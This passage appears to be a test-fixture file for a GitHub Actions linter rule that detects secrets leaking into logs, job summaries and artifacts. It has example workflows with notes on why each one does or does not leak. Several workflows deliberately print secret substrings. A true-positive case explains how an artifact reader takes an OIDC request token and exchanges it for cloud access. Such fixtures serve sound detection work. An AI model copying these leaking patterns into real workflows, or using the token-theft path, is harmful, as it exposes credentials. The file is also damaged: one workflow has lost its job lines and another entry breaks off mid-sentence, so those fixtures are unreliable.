#   lines of the secret that the action prints in its output. The advisories
#   name no workflow; the jobs are the configurations that the advisories

# attack-run-behavior: when the step fails, the action prints an exception
#   with a part of the token. In the job php, Composer prints the token in
#   its error; in the job steam, the post step of setup-steamcmd, at the end
#   of the job, prints
#   config.vdf with the saved token of the Steam account, which does not
#   expire when the job ends.
# advisory: https://github.com/advisories/GHSA-26wh-cc3r-w6pj
# advisory: https://github.com/advisories/GHSA-4mgv-m5cm-f9h7
# advisory: https://github.com/advisories/GHSA-5wxr-w449-57cm
# advisory: https://github.com/advisories/GHSA-c5qx-p38x-qf5w
# advisory: https://github.com/advisories/GHSA-mj96-mh85-r574
on: push
permissions: {}
jobs:
  version:
    runs-on: ubuntu-latest
    steps:
      - uses: canonical/get-workflow-version-action@a5d53b08d254a157ea441c9819ea5002ffc12edc # v1.0.0
        with:
          repository-name: canonical/data-platform-workflows
          file-name: build_charm.yaml
          github-token: ${{ secrets.GITHUB_TOKEN }}
  php:
    runs-on: ubuntu-latest
    steps:
      - uses: shivammathur/setup-php@accd6127cb78bee3e8082180cb391013d204ef9f # 2.37.0
        with:
          php-version: '8.3'
          tools: composer:2.9.7
  steam:
    runs-on: ubuntu-latest
    steps:
      - uses: RageAgainstThePixel/setup-steamcmd@ec536b530bd3bd059377d0d0c376c52c6b870de1 # v1.2.7
      - run: steamcmd +login "$STEAM_USERNAME" "$STEAM_PASSWORD" +quit
        env:
          STEAM_USERNAME: ${{ secrets.STEAM_USERNAME }}
          STEAM_PASSWORD: ${{ secrets.STEAM_PASSWORD }}
  vault:
    runs-on: ubuntu-latest
    steps:
      - uses: hashicorp/vault-action@5e5c06a3c8e96b7c4757fe7a10e03469cdbd07bb # v2.1.2
        with:
          url: https://vault.example.com
          token: ${{ secrets.VAULT_TOKEN }}
          secrets: secret/data/ci certificate | CERTIFICATE

undetected_forms.text: a job or a step inside a reusable workflow of another repository (uses: owner/repo/.github/workflows/<file>@<ref>) whose content the fact workflow.definition does not give. For every rule: a run that does not ask the fact (a run without --online and without the answer in --facts). For a quality rule, also: a run where the linter asked the fact and got no answer (an answer of unknown: the GitHub API did not give the file), and a call deeper than the 3 levels of reusable workflows that the linter reads, for which the linter does not ask the fact. The rule reads a reusable workflow of another repository only from the answer of workflow.definition. For a rule that is not a quality rule (a rule with a threat), the last two forms are the inconclusive kind remote-callee-unknown, not this form

notes.attack_run_behavior: the step prints "token starts with" and eight characters of the token; the log keeps them for 90 days by default.

false_positive_forms.text: an assignment in a branch of if, after && or ||, in the body of a loop, or in the body of a function called there, that bash does not run (if false; then s=$KEY; fi): the rule does not read the value of a condition, so the rule reads the assignment as one that may run, and reads the variable as one that may hold the value of the assignment

examples.name: branch-not-run.yml
examples.text:
# situation: on push, in a public repository (repo.public true), a step sets a
#   variable to the private key out of the secret GCP_SA_KEY in an if whose
#   condition is false, and prints the variable.
# reason: bash does not run the branch, so the variable is empty when echo
#   runs, and the log has no part of the secret.
# cause: the rule does not read the value of the condition of an if, and
#   reads the assignment in the branch as one that may run.
# attack: anyone signed in to GitHub opens the run's log and reads the
#   private key.
# attack-run-behavior: the step prints "key:" alone.
on: push
permissions: {}
jobs:
  deploy:
    runs-on: ubuntu-latest
    steps:
      - env:
          GCP_SA_KEY: ${{ secrets.GCP_SA_KEY }}
        run: |
          if false; then PRIVATE_KEY=$(echo "$GCP_SA_KEY" | jq -r '.private_key'); fi
          echo "key: $PRIVATE_KEY"

notes.situation: on push, in a public repository (repo.public true), a step sets a variable to the private key out of the secret GCP_SA_KEY in an if whose condition is false, and prints the variable.
notes.reason: bash does not run the branch, so the variable is empty when echo runs, and the log has no part of the secret.
notes.cause: the rule does not read the value of the condition of an if, and reads the assignment in the branch as one that may run.
notes.attack: anyone signed in to GitHub opens the run's log and reads the private key.
notes.attack_run_behavior: the step prints "key:" alone.

false_positive_forms.text: a value made from a secret that the body of a shell function prints after an exec in the body points the standard output elsewhere, after a return in the body, or with a redirect of the print that points the standard output elsewhere, where a call of the function with arguments writes to $GITHUB_STEP_SUMMARY (f() { exec >/dev/null; echo "${KEY:1}"; }; f a >>"$GITHUB_STEP_SUMMARY"): the job summary gets nothing from the print; the rule reads what such a call writes from every command of the body of the function, and does not read where the commands of the body point the standard output or which commands of the body run

examples.name: writer-body.yml
examples.text:
# situation: on push, in a public repository (repo.public true), a step
#   defines a function f that points the standard output to /dev/null with
#   exec and then prints the secret GCP_SA_KEY without the first character of
#   the secret, and calls f with an argument, appending the standard output of
#   the call to $GITHUB_STEP_SUMMARY.
# reason: the exec sends the print to /dev/null, so the job summary gets no
#   part of the secret.
# cause: the rule reads what a call of a function with arguments writes
#   from every command of the body of the function, and does not read where
#   the exec in the body points the standard output.
# attack: anyone who can read the run opens the job summary of the run and
#   reads the secret.
# attack-run-behavior: the job summary of the run is empty.
on: push
permissions: {}
jobs:
  deploy:
    runs-on: ubuntu-latest
    steps:
      - env:
          GCP_SA_KEY: ${{ secrets.GCP_SA_KEY }}
        run: |
          f() { exec >/dev/null; echo "${GCP_SA_KEY:1}"; }
          f report >>"$GITHUB_STEP_SUMMARY"

notes.situation: on push, in a public repository (repo.public true), a step defines a function f that points the standard output to /dev/null with exec and then prints the secret GCP_SA_KEY without the first character of the secret, and calls f with an argument, appending the standard output of the call to $GITHUB_STEP_SUMMARY.
notes.reason: the exec sends the print to /dev/null, so the job summary gets no part of the secret.
notes.cause: the rule reads what a call of a function with arguments writes from every command of the body of the function, and does not read where the exec in the body points the standard output.
notes.attack: anyone who can read the run opens the job summary of the run and reads the secret.
notes.attack_run_behavior: the job summary of the run is empty.

false_positive_forms.text: a value made from a secret that a command of a $( ) prints after an exec in the $( ) points the standard output at a file descriptor that an exec before a pipeline opened, where the $( ) is in a word of a command of the pipeline and the last command of the pipeline writes to $GITHUB_STEP_SUMMARY (exec 3>/dev/null; echo "$(exec >&3; echo "${KEY:1}")" | cat >>"$GITHUB_STEP_SUMMARY"): the print goes where the file descriptor points, not to the value of the $( ), so the job summary gets nothing from the print; the rule reads such a pipeline without the file descriptors that the commands before the pipeline opened

examples.name: pipeline-descriptor.yml
examples.text:
# situation: on push, in a public repository (repo.public true), a step opens
#   file descriptor 3 on /dev/null with exec, and appends to
#   $GITHUB_STEP_SUMMARY, through cat, a line of "key:" and a $( ) in which
#   exec points the standard output at file descriptor 3 and then an echo
#   prints the secret GCP_SA_KEY without the first character of the secret.
# reason: the exec in the $( ) sends the print to file descriptor 3, which
#   points at /dev/null, so the $( ) is empty and the job summary gets no
#   part of the secret.
# cause: the rule reads a pipeline whose last command writes to the job
#   summary without the file descriptors that the exec before the pipeline
#   opened, and reads the print as a part of the value of the $( ).
# attack: anyone who can read the run opens the job summary of the run and
#   reads the secret.
# attack-run-behavior: the job summary of the run gets "key:" alone.
on: push
permissions: {}
jobs:
  deploy:
    runs-on: ubuntu-latest
    steps:
      - env:
          GCP_SA_KEY: ${{ secrets.GCP_SA_KEY }}
        run: |
          exec 3>/dev/null
          echo "key: $(exec >&3; echo "${GCP_SA_KEY:1}")" | cat >>"$GITHUB_STEP_SUMMARY"

notes.situation: on push, in a public repository (repo.public true), a step opens file descriptor 3 on /dev/null with exec, and appends to $GITHUB_STEP_SUMMARY, through cat, a line of "key:" and a $( ) in which exec points the standard output at file descriptor 3 and then an echo prints the secret GCP_SA_KEY without the first character of the secret.
notes.reason: the exec in the $( ) sends the print to file descriptor 3, which points at /dev/null, so the $( ) is empty and the job summary gets no part of the secret.
notes.cause: the rule reads a pipeline whose last command writes to the job summary without the file descriptors that the exec before the pipeline opened, and reads the print as a part of the value of the $( ).
notes.attack: anyone who can read the run opens the job summary of the run and reads the secret.
notes.attack_run_behavior: the job summary of the run gets "key:" alone.

false_positive_forms.text: a value made from a secret that a command of a pipeline prints elsewhere than the pipe, by a redirect of the command or after an exec in a $( ) of the command, where the last command of the pipeline is not a simple command and writes to $GITHUB_STEP_SUMMARY (echo "$(exec >/dev/null; echo "${KEY:1}")" | { cat; } >>"$GITHUB_STEP_SUMMARY"): the job summary gets nothing from the print; the rule reads such a pipeline by every simple command, and does not read where the commands point the standard output

examples.name: pipeline-compound.yml
examples.text:
# situation: on push, in a public repository (repo.public true), a step
#   appends to $GITHUB_STEP_SUMMARY, through a pipe to cat in a group, a line
#   of "key:" and a $( ) in which exec points the standard output to /dev/null
#   and then an echo prints the secret GCP_SA_KEY without the first character
#   of the secret.
# reason: the exec sends the print to /dev/null, so the $( ) is empty and
#   the job summary gets no part of the secret.
# cause: the rule reads a pipeline whose last command is a group by every
#   simple command, and does not read where the exec in the $( ) points the
#   standard output.
# attack: anyone who can read the run opens the job summary of the run and

on: push
permissions: {}
jobs:
  deploy:

    steps:

        run: |
          echo "key: $(exec >/dev/null; echo "${GCP_SA_KEY:1}")" | { cat; } >>"$GITHUB_STEP_SUMMARY"

notes.situation: on push, in a public repository (repo.public true), a step appends to $GITHUB_STEP_SUMMARY, through a pipe to cat in a group, a line of "key:" and a $( ) in which exec points the standard output to /dev/null and then an echo prints the secret GCP_SA_KEY without the first character of the secret.
notes.reason: the exec sends the print to /dev/null, so the $( ) is empty and the job summary gets no part of the secret.
notes.cause: the rule reads a pipeline whose last command is a group by every simple command, and does not read where the exec in the $( ) points the standard output.
notes.attack: anyone who can read the run opens the job summary of the run and reads the secret.
notes.attack_run_behavior: the job summary of the run gets "key:" alone.

false_positive_forms.text: a value made from a secret that a pipeline writes to $GITHUB_STEP_SUMMARY, where a redirect of the last command of the pipeline copies a file descriptor that is not open (echo "${KEY:1}" | cat >&3 >>"$GITHUB_STEP_SUMMARY"): bash does not run the last command, so the job summary gets nothing; the rule reads the last command of such a pipeline as writing to the job summary, and does not read whether a redirect of the last command fails

examples.name: failing-pipe-redirect.yml
examples.text:
# situation: on push, in a public repository (repo.public true), a step pipes
#   "key:" and the secret GCP_SA_KEY without the first character of the secret
#   to cat, whose redirects copy file descriptor 3, which is not open, and
#   append to $GITHUB_STEP_SUMMARY, and goes on when cat fails (|| true).
# reason: the copy of file descriptor 3 fails, so bash does not run cat, and
#   the job summary gets no part of the secret.
# cause: the rule reads the last command of the pipeline as writing to the
#   job summary, and does not read whether a redirect of the last command
#   fails.
# attack: anyone who can read the run opens the job summary of the run and
#   reads the secret.
# attack-run-behavior: the job summary of the run is empty.
on: push
permissions: {}
jobs:
  deploy:
    runs-on: ubuntu-latest
    steps:
      - env:
          GCP_SA_KEY: ${{ secrets.GCP_SA_KEY }}
        run: |
          echo "key: ${GCP_SA_KEY:1}" | cat >&3 >>"$GITHUB_STEP_SUMMARY" || true

notes.situation: on push, in a public repository (repo.public true), a step pipes "key:" and the secret GCP_SA_KEY without the first character of the secret to cat, whose redirects copy file descriptor 3, which is not open, and append to $GITHUB_STEP_SUMMARY, and goes on when cat fails (|| true).
notes.reason: the copy of file descriptor 3 fails, so bash does not run cat, and the job summary gets no part of the secret.
notes.cause: the rule reads the last command of the pipeline as writing to the job summary, and does not read whether a redirect of the last command fails.
notes.attack: anyone who can read the run opens the job summary of the run and reads the secret.
notes.attack_run_behavior: the job summary of the run is empty.

false_positive_forms.text: a value made from a secret that a command, which the script runs in the background (&) with no wait for the command, writes to $GITHUB_ENV after the shell of the script ends (for example: (sleep 5; echo "P=${KEY:1}" >> "$GITHUB_ENV") &): a write that the command makes after the shell of the script ends does not reach the steps after the step, so the header of a later step does not print the value; the rule reads the write as a write that reaches $GITHUB_ENV, because whether the command writes before the shell of the script ends depends on how long the commands take when the step runs

examples.name: background-write.yml
examples.text:
# situation: on push, in a public repository (repo.public true), a step runs
#   in the background (&), with no wait, a subshell that sleeps 5 seconds and
#   then writes P= and the secret DEPLOY_TOKEN without the first character of
#   the secret to $GITHUB_ENV; the shell of the script ends before the write;
#   a later step runs.
# reason: a write that the background command makes after the shell of the
#   script ends does not reach the steps after the step (seen on the runner
#   on 2026-11-17), so the header of the later step prints no P.
# cause: the rule reads the write in the background as a write that reaches
#   $GITHUB_ENV, and does not read when the background command writes.
# attack: anyone who can read the run opens the log of the run and reads
#   the secret.
# attack-run-behavior: the header of the later step has no P in its env.
on: push
permissions: {}
jobs:
  deploy:
    runs-on: ubuntu-latest
    steps:
      - env:
          DEPLOY_TOKEN: ${{ secrets.DEPLOY_TOKEN }}
        run: |
          (sleep 5; echo "P=${DEPLOY_TOKEN:1}" >> "$GITHUB_ENV") &
      - run: echo done

notes.situation: on push, in a public repository (repo.public true), a step runs in the background (&), with no wait, a subshell that sleeps 5 seconds and then writes P= and the secret DEPLOY_TOKEN without the first character of the secret to $GITHUB_ENV; the shell of the script ends before the write; a later step runs.
notes.reason: a write that the background command makes after the shell of the script ends does not reach the steps after the step (seen on the runner on 2026-11-17), so the header of the later step prints no P.
notes.cause: the rule reads the write in the background as a write that reaches $GITHUB_ENV, and does not read when the background command writes.
notes.attack: anyone who can read the run opens the log of the run and reads the secret.
notes.attack_run_behavior: the header of the later step has no P in its env.

false_positive_forms.text: a value the shell made that is a form the runner registers: the base64 of the value without a line break and not folded (base64 -w0, echo -n), the base64 of a value whose length is a multiple of 3, with the line break base64 writes (the head of the output is the base64 of the value, which the runner masks; the last characters left in the log encode the line break alone), or jq -c . of a secret whose JSON is already in the form jq -c writes

examples.name: masked-encoding.yml
examples.text:
# situation: on push, a step prints the base64 of the secret API_KEY, made
#   without a line break and not folded.
# reason: the runner registers the base64 of each secret it gets, so the
#   base64 is printed as ***.
# cause: the rule takes a value base64 makes as a value the runner does not
#   mask, as the rule does not tell the forms the runner registers.
# attack: one who may read the run's log opens the log to read the base64.
# attack-run-behavior: the step prints "***".
on: push
permissions: {}
jobs:
  check:
    runs-on: ubuntu-latest
    steps:
      - env:
          API_KEY: ${{ secrets.API_KEY }}
        run: echo "$(printf '%s' "$API_KEY" | base64 -w0)"

notes.situation: on push, a step prints the base64 of the secret API_KEY, made without a line break and not folded.
notes.reason: the runner registers the base64 of each secret it gets, so the base64 is printed as ***.
notes.cause: the rule takes a value base64 makes as a value the runner does not mask, as the rule does not tell the forms the runner registers.
notes.attack: one who may read the run's log opens the log to read the base64.
notes.attack_run_behavior: the step prints "***".

false_positive_forms.text: whole lines of a secret of the secrets context with more than one line, taken by head, tail, grep or sed -n: for a secret of the secrets context, the runner registers each line of the secret

examples.name: secret-lines.yml
examples.text:
# situation: on push, a step prints the first line of the secret
#   PRIVATE_KEY, a key of more than one line.
# reason: the runner registers each line of each secret it gets, so the
#   first line is printed as ***.
# cause: the rule takes what head prints as a value made from the secret,
#   as the rule does not know that the secret has more than one line.
# attack: one who may read the run's log opens the log to read the line.
# attack-run-behavior: the step prints "***".
on: push
permissions: {}
jobs:
  check:
    runs-on: ubuntu-latest
    steps:
      - env:
          PRIVATE_KEY: ${{ secrets.PRIVATE_KEY }}
        run: echo "$PRIVATE_KEY" | head -n 1

notes.situation: on push, a step prints the first line of the secret PRIVATE_KEY, a key of more than one line.
notes.reason: the runner registers each line of each secret it gets, so the first line is printed as ***.
notes.cause: the rule takes what head prints as a value made from the secret, as the rule does not know that the secret has more than one line.
notes.attack: one who may read the run's log opens the log to read the line.
notes.attack_run_behavior: the step prints "***".

false_positive_forms.text: a value registered by a ::add-mask:: of an expression or of another variable holding the same value, by core.setSecret of actions/github-script, or by an action

examples.name: other-mask.yml
examples.text:
# situation: on push, a step registers the password taken out of the secret
#   DB with ::add-mask:: of a substitution, and prints the password from
#   another variable after.
# reason: the runner masks the password from the line after its ::add-mask::
#   on, so the password is printed as ***.
# cause: the rule reads a registration of one variable, not of a
#   substitution that writes the same value.
# attack: one who may read the run's log opens the log to read the password.
# attack-run-behavior: the step prints "password: ***".
on: push
permissions: {}
jobs:
  migrate:
    runs-on: ubuntu-latest
    steps:
      - env:
          DB: ${{ secrets.DB }}
        run: |
          echo "::add-mask::$(jq -r .password <<< "$DB")"
          PASSWORD=$(jq -r .password <<< "$DB")
          echo "password: $PASSWORD"

notes.situation: on push, a step registers the password taken out of the secret DB with ::add-mask:: of a substitution, and prints the password from another variable after.
notes.reason: the runner masks the password from the line after its ::add-mask:: on, so the password is printed as ***.
notes.cause: the rule reads a registration of one variable, not of a substitution that writes the same value.
notes.attack: one who may read the run's log opens the log to read the password.
notes.attack_run_behavior: the step prints "password: ***".

false_positive_forms.text: a command or an expansion that gives a value of one line as the value was: tr -d '\n', head -n1, sort or uniq of one line, ${X%$'\n'}, a sed that does not match; the runner masks the value of the secret

examples.name: unchanged-value.yml
examples.text:
# situation: on push, a step removes the line breaks of the secret
#   DEPLOY_TOKEN with tr and prints the result; the secret is one line.
# reason: for a secret of one line, tr -d '\n' gives the value of the
#   secret as the value was, which the runner masks, so the log has ***.
# cause: the rule reads tr as a command that changes the input, and does
#   not know that a value of one line comes out of tr -d '\n' as the value
#   was.
# attack: one who may read the run's log opens the log to read the token.
# attack-run-behavior: the step prints "token: ***".
on: push
permissions: {}
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - env:
          DEPLOY_TOKEN: ${{ secrets.DEPLOY_TOKEN }}
        run: |
          echo "token: $(echo "$DEPLOY_TOKEN" | tr -d '\n')"

notes.situation: on push, a step removes the line breaks of the secret DEPLOY_TOKEN with tr and prints the result; the secret is one line.
notes.reason: for a secret of one line, tr -d '\n' gives the value of the secret as the value was, which the runner masks, so the log has ***.
notes.cause: the rule reads tr as a command that changes the input, and does not know that a value of one line comes out of tr -d '\n' as the value was.
notes.attack: one who may read the run's log opens the log to read the token.
notes.attack_run_behavior: the step prints "token: ***".

false_positive_forms.text: a command that changes the input, whose program gives a value that holds nothing of the input: jq 'type == "array"', jq length and the like; the output does not give the value of the secret

examples.name: filter-result.yml
examples.text:
# situation: on push, a step checks with jq that the secret DOMAINS is a
#   JSON array, and jq prints the answer.
# reason: the filter type == "array" gives true or false, which holds
#   nothing of the secret; the log has true.
# cause: the rule reads jq as a command that writes a value made from the
#   input, and does not read what the filter of jq gives.
# attack: one who may read the run's log opens the log to read the secret.
# attack-run-behavior: the step prints "true".
on: push
permissions: {}
jobs:
  deploy:
    runs-on: ubuntu-latest
    steps:
      - env:
          DOMAINS: ${{ secrets.DOMAINS }}
        run: |
          jq -e 'type == "array"' <<< "$DOMAINS"

notes.situation: on push, a step checks with jq that the secret DOMAINS is a JSON array, and jq prints the answer.
notes.reason: the filter type == "array" gives true or false, which holds nothing of the secret; the log has true.
notes.cause: the rule reads jq as a command that writes a value made from the input, and does not read what the filter of jq gives.
notes.attack: one who may read the run's log opens the log to read the secret.
notes.attack_run_behavior: the step prints "true".

false_positive_forms.text: the body of a function that prints an argument or a variable, where the call that carries the value made from a secret sends the output to a file, or where a ::add-mask:: that comes before the call, but after the body in the text, registers the value: the rule reads the body with the arguments of every call, and compares a ::add-mask:: with the body by the place in the text

examples.name: function-calls.yml
examples.text:
# situation: on push, a function prints its argument; a step calls the
#   function with four characters of the secret DEPLOY_TOKEN and sends the
#   output of that call to a file, and calls the function again with a
#   literal.
# reason: the call that carries the four characters writes to out.txt, not
#   to the log; the log has the literal alone.
# cause: the rule reads the body of the function with the arguments of
#   every call, and takes the body as printing because one call prints. The
#   rule also compares a ::add-mask:: with the body by the place in the
#   text, not by the order of the calls.
# attack: one who may read the run's log opens the log to read the four
#   characters.
# attack-run-behavior: the step prints "safe" alone.
on: push
permissions: {}
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - env:
          DEPLOY_TOKEN: ${{ secrets.DEPLOY_TOKEN }}
        run: |
          h() { echo "$1"; }
          h "${DEPLOY_TOKEN:0:4}" > out.txt
          h safe

notes.situation: on push, a function prints its argument; a step calls the function with four characters of the secret DEPLOY_TOKEN and sends the output of that call to a file, and calls the function again with a literal.
notes.reason: the call that carries the four characters writes to out.txt, not to the log; the log has the literal alone.
notes.cause: the rule reads the body of the function with the arguments of every call, and takes the body as printing because one call prints. The rule also compares a ::add-mask:: with the body by the place in the text, not by the order of the calls.
notes.attack: one who may read the run's log opens the log to read the four characters.
notes.attack_run_behavior: the step prints "safe" alone.

false_positive_forms.text: a private or internal repository, where the value is secret-in-log.private: whoever may read the repository reads the value

examples.name: private-repository.yml
examples.text:
# situation: on push, a step prints a substring of the secret DEPLOY_TOKEN,
#   in a private repository.
# reason: the repository is private or internal, so the value is
#   secret-in-log.private, not .public: only those with read access, every
#   member of the enterprise for an internal one, read the log.
# cause: unless a file of facts or --fact says that the repository is not
#   public (repo.public false), the rule reports the finding. When no source
#   answers repo.public, the finding is conditional.
# attack: anyone without access to the repository tries to read the run's
#   log to take the substring of the token.
# attack-run-behavior: GitHub does not show the log of a private or
#   internal repository to those without read access; those with it read
#   eight characters of the token.
on: push
permissions: {}
jobs:
  check:
    runs-on: ubuntu-latest
    steps:
      - env:
          DEPLOY_TOKEN: ${{ secrets.DEPLOY_TOKEN }}
        run: echo "token starts with ${DEPLOY_TOKEN:0:8}"

notes.situation: on push, a step prints a substring of the secret DEPLOY_TOKEN, in a private repository.
notes.reason: the repository is private or internal, so the value is secret-in-log.private, not .public: only those with read access, every member of the enterprise for an internal one, read the log.
notes.cause: unless a file of facts or --fact says that the repository is not public (repo.public false), the rule reports the finding. When no source answers repo.public, the finding is conditional.
notes.attack: anyone without access to the repository tries to read the run's log to take the substring of the token.
notes.attack_run_behavior: GitHub does not show the log of a private or internal repository to those without read access; those with it read eight characters of the token.

false_positive_forms.text: a workflow whose run GitHub does not start, or a job that GitHub fails in the step "Set up job", because of the setting of allowed actions of GitHub (the fact repo.allowed-actions, which the quality rule allowed-actions reads): GitHub does not start a run of a workflow that has a uses, or that calls a reusable workflow that has a uses, that the setting does not allow, and fails a job before any step of the job runs when a step of a composite action that the job runs has a uses that the setting does not allow, or when the setting requires a full commit SHA and a step names an action by a tag or a branch. The harm that the finding reports happens only when GitHub runs the workflow or the job, and the rule does not read repo.allowed-actions

examples.name: actions-not-allowed.yml
examples.text:
# situation: the workflow of the true positive private (private.yml) of the
#   rule, with a job added whose step uses example-org/not-allowed-action,
#   which the setting of allowed actions of GitHub (repo.allowed-actions)
#   blocks with !example-org/not-allowed-action@*. In the true positive, on
#   push, in a private repository (repo.public answered false), a step
#   prints the first characters of the secret DEPLOY_TOKEN to check which
#   token is set.
# reason: GitHub checks each uses of the workflow before the run starts, and
#   does not start the run because of the uses of
#   example-org/not-allowed-action: no job of the run runs, so what the
#   reason of the true positive says does not happen (in runs that the

true_negatives.text:
# situation: on push, the job whose id is disabled has if: false, and the job
#   whose id is on-failure needs the job build and has if: needs.build.result
#   == 'failure'; each of the two jobs runs google-github-actions/auth v2 with
#   the secret GCP_KEY, which writes a key file of the service account in the
#   workspace, and uploads the workspace as an artifact.
# reason: GitHub skips the job disabled because the if of the job disabled is
#   false. The if of the job on-failure calls no status function, so GitHub
#   evaluates the if of the job on-failure only when the job build succeeded;
#   needs.build.result is then success, and the if is false. When the job
#   build fails or is skipped, GitHub skips the job on-failure without
#   evaluating the if. So neither job runs
#   (https://github.com/github/docs/blob/404a5f4de6cd5311e3ce2d5c076571291e0107d6/data/reusables/actions/jobs/section-using-conditions-to-control-job-execution.md).
# attack: anyone who can read the repository downloads the artifacts of the
#   run and reads the key file.
# attack-run-behavior: GitHub skips the job disabled and the job on-failure,
#   so no step writes the key file and no step uploads an artifact.
on: push
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - run: echo built
  disabled:
    if: false
    runs-on: ubuntu-latest
    steps:
      - uses: google-github-actions/auth@v2
        with:
          credentials_json: ${{ secrets.GCP_KEY }}
      - uses: actions/upload-artifact@v4
        with:
          path: .
  on-failure:
    needs: build
    if: needs.build.result == 'failure'
    runs-on: ubuntu-latest
    steps:
      - uses: google-github-actions/auth@v2
        with:
          credentials_json: ${{ secrets.GCP_KEY }}
      - uses: actions/upload-artifact@v4
        with:
          path: .

true_positives.text:
# situation: google-github-actions/auth, with Workload Identity Federation,
#   writes a credential of the job to gha-creds-*.json in the workspace, and
#   actions/upload-artifact, the last step, uploads the workspace.
# reason: path: . puts gha-creds-*.json in the artifact; v4 artifacts can be
#   downloaded while the run goes on, and the credential still works through
#   the post steps.
# attack: a reader of the repository's artifacts (anyone, in a public
#   repository) downloads the artifact through the API while the job still
#   runs, and takes from gha-creds-*.json its credential_source: the URL of
#   the OIDC token request and the bearer token of its Authorization header.
# attack-run-behavior: google-github-actions/auth writes
#   gha-creds-<hex>.json at the top of the workspace, with
#   ACTIONS_ID_TOKEN_REQUEST_URL and ACTIONS_ID_TOKEN_REQUEST_TOKEN; the
#   upload of path . puts it in the artifact, which can be downloaded once
#   the upload ends, and while the post steps run, the request token still
#   gets OIDC tokens of the job, which Google's STS (the file's token_url)
#   exchanges for the service account's access.
on: push
jobs:
  a:
    runs-on: ubuntu-latest
    steps:
      - uses: google-github-actions/auth@v2
        with:
          workload_identity_provider: projects/1/locations/global/workloadIdentityPools/p/providers/github
          service_account: ci@p.iam.gserviceaccount.com
      - uses: actions/upload-artifact@v4
        with:
          path: .
